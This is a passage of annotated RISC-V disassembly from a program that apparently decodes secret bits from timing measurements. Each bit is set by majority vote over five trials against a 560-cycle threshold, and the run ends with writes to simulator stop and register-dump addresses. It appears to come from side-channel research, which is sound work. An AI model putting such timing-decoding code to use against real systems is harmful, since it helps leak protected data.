    802002b8:	fef42423          	sw	a5,-24(s0)
    802002bc:	fe842783          	lw	a5,-24(s0)
    802002c0:	0007871b          	sext.w	a4,a5
    802002c4:	00400793          	li	a5,4
    802002c8:	f4e7dae3          	bge	a5,a4,8020021c <main+0xb0>
        int sum = 0;
    802002cc:	fe042023          	sw	zero,-32(s0)
        for (int t = 0; t < TRIAL; t++) {
    802002d0:	fc042e23          	sw	zero,-36(s0)
    802002d4:	0380006f          	j	8020030c <main+0x1a0>
            if (cycles[t] > 560)
    802002d8:	fdc42783          	lw	a5,-36(s0)
    802002dc:	00379793          	sll	a5,a5,0x3
    802002e0:	ff078793          	add	a5,a5,-16
    802002e4:	008787b3          	add	a5,a5,s0
    802002e8:	f507b703          	ld	a4,-176(a5)
    802002ec:	23000793          	li	a5,560
    802002f0:	00e7f863          	bgeu	a5,a4,80200300 <main+0x194>
                sum++;
    802002f4:	fe042783          	lw	a5,-32(s0)
    802002f8:	0017879b          	addw	a5,a5,1
    802002fc:	fef42023          	sw	a5,-32(s0)
        for (int t = 0; t < TRIAL; t++) {
    80200300:	fdc42783          	lw	a5,-36(s0)
    80200304:	0017879b          	addw	a5,a5,1
    80200308:	fcf42e23          	sw	a5,-36(s0)
    8020030c:	fdc42783          	lw	a5,-36(s0)
    80200310:	0007871b          	sext.w	a4,a5
    80200314:	00400793          	li	a5,4
    80200318:	fce7d0e3          	bge	a5,a4,802002d8 <main+0x16c>
        bits[idx] = (sum > TRIAL/2)? 1:0;
    8020031c:	fe042783          	lw	a5,-32(s0)
    80200320:	0007871b          	sext.w	a4,a5
    80200324:	00200793          	li	a5,2
    80200328:	00e7a7b3          	slt	a5,a5,a4
    8020032c:	0ff7f793          	zext.b	a5,a5
    80200330:	00078713          	mv	a4,a5
    80200334:	fec42783          	lw	a5,-20(s0)
    80200338:	ff078793          	add	a5,a5,-16
    8020033c:	008787b3          	add	a5,a5,s0
    80200340:	f8e78c23          	sb	a4,-104(a5)
        votes[idx] = (sum > TRIAL/2)? sum: TRIAL - sum;
    80200344:	fe042783          	lw	a5,-32(s0)
    80200348:	0007871b          	sext.w	a4,a5
    8020034c:	00200793          	li	a5,2
    80200350:	00e7ce63          	blt	a5,a4,8020036c <main+0x200>
    80200354:	fe042783          	lw	a5,-32(s0)
    80200358:	0ff7f793          	zext.b	a5,a5
    8020035c:	00500713          	li	a4,5
    80200360:	40f707bb          	subw	a5,a4,a5
    80200364:	0ff7f793          	zext.b	a5,a5
    80200368:	00c0006f          	j	80200374 <main+0x208>
    8020036c:	fe042783          	lw	a5,-32(s0)
    80200370:	0ff7f793          	zext.b	a5,a5
    80200374:	fec42703          	lw	a4,-20(s0)
    80200378:	ff070713          	add	a4,a4,-16
    8020037c:	00870733          	add	a4,a4,s0
    80200380:	f6f70c23          	sb	a5,-136(a4)
        printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
    80200384:	fec42783          	lw	a5,-20(s0)
    80200388:	ff078793          	add	a5,a5,-16
    8020038c:	008787b3          	add	a5,a5,s0
    80200390:	f987c783          	lbu	a5,-104(a5)
    80200394:	0007871b          	sext.w	a4,a5
    80200398:	fec42783          	lw	a5,-20(s0)
    8020039c:	ff078793          	add	a5,a5,-16
    802003a0:	008787b3          	add	a5,a5,s0
    802003a4:	f787c783          	lbu	a5,-136(a5)
    802003a8:	0007879b          	sext.w	a5,a5
    802003ac:	00500693          	li	a3,5
    802003b0:	00078613          	mv	a2,a5
    802003b4:	00070593          	mv	a1,a4
    802003b8:	00000517          	auipc	a0,0x0
    802003bc:	21050513          	add	a0,a0,528 # 802005c8 <main+0x45c>
    802003c0:	ffe02097          	auipc	ra,0xffe02
    802003c4:	b08080e7          	jalr	-1272(ra) # 80001ec8 <printf>
    for (int idx = S_WORD - 1; idx >= 0; idx--) {
    802003c8:	fec42783          	lw	a5,-20(s0)
    802003cc:	fff7879b          	addw	a5,a5,-1
    802003d0:	fef42623          	sw	a5,-20(s0)
    802003d4:	fec42783          	lw	a5,-20(s0)
    802003d8:	0007879b          	sext.w	a5,a5
    802003dc:	de07d6e3          	bgez	a5,802001c8 <main+0x5c>

    uint8_t *stopsig_addr = 0x60000000;
    802003e0:	600007b7          	lui	a5,0x60000
    802003e4:	fcf43423          	sd	a5,-56(s0)
    uint8_t *regdump_addr = 0x60000010;
    802003e8:	600007b7          	lui	a5,0x60000
    802003ec:	01078793          	add	a5,a5,16 # 60000010 <threadsense.2+0x5fffff8c>
    802003f0:	fcf43023          	sd	a5,-64(s0)
    uint8_t test = 0;
    802003f4:	fa040fa3          	sb	zero,-65(s0)
    *regdump_addr = test;
    802003f8:	fc043783          	ld	a5,-64(s0)
    802003fc:	fbf44703          	lbu	a4,-65(s0)
    80200400:	00e78023          	sb	a4,0(a5)
    asm volatile("fence\n");
    80200404:	0ff0000f          	fence
    *stopsig_addr = 0x0;
    80200408:	fc843783          	ld	a5,-56(s0)
    8020040c:	00078023          	sb	zero,0(a5)

    return 0;
    80200410:	00000793          	li	a5,0
}
    80200414:	00078513          	mv	a0,a5
    80200418:	0b813083          	ld	ra,184(sp)
    8020041c:	0b013403          	ld	s0,176(sp)
    80200420:	0c010113          	add	sp,sp,192
    80200424:	00008067          	ret
